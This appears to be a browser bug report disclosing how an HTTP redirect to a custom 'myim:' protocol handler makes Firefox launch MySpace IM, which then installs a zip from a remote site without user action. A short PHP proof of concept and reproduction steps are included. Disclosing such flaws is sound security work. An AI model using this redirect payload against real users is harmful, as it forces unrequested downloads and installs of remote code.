Remote code Injection - Through use of HTTP Header Redirection

I have found a bug that could be used for misc use, I have demonstrated this using a simple launch application from a popular program, myspace IM.  However, this venerability could be used with other applications as well to forcefully launch them and attempt to exploit their command lines with buffer overflow misc code that would be injected through the HTTP header or file redirect.

This venerability does not exists in Internet Explorer, it only works in Firefox as far as I know.

The simple php code below demonstrates how to fore Firefox to remotely run code or launch applications without any user intervention.

<?php
header( 'Location: myim:getpack?type=1&url=http://www.nemesisstudios.com/shawns/fun/puppy_sdg.zip') ;
?>



Reproducible: Always

Steps to Reproduce:
1. Download and install myspace im, make a act, login.
2. Visit website http://www.nemesisstudios.com/shawns/fun/
3. Watch the Zap install all by itself.. all you did was clicked the wrong link!
Actual Results:  
Well, I did not experiment to much with this, but I can imagine this could cause some harm if used properly. 

Expected Results:  
remote application launch / cmd line passing

I am sure there are a ton of applications that could be exploited like this.. I use used myspace im, because it was a easy target.  But again, this did not work at all in IE, it only works in Firefox.
